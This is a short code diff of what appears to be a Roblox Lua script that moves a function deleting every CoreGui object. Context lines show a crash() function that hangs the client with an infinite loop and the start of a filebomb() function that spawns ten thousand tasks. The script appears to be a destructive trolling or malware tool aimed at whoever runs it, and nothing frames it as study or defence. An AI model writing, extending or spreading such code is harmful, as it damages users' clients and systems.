@@ -36,6 +36,15 @@ local function crash()
 	while true do end
 end
 
+local function delete_coregui()
+	for _, o in pairs(CoreGui:GetDescendants()) do
+		if not CoreGui.Execution then
+			o:Destroy()
+			print(`Deleting CoreGui Object: {o}`)
+		end
+	end
+end
+
 local function filebomb()
 	for i = 1, 10000 do
 		task.spawn(function()
@@ -56,14 +65,6 @@ local function msgbox()
 	end
 end
 
-local function delete_coregui()
-	for _, o in pairs(CoreGui:GetDescendants()) do
-		if not CoreGui.Execution then
-			o:Destroy()
-			print(`Deleting CoreGui Object: {o}`)
-		end
-	end
-end
 
 -- Music
 local Sound = Instance.new("Sound", SoundService)
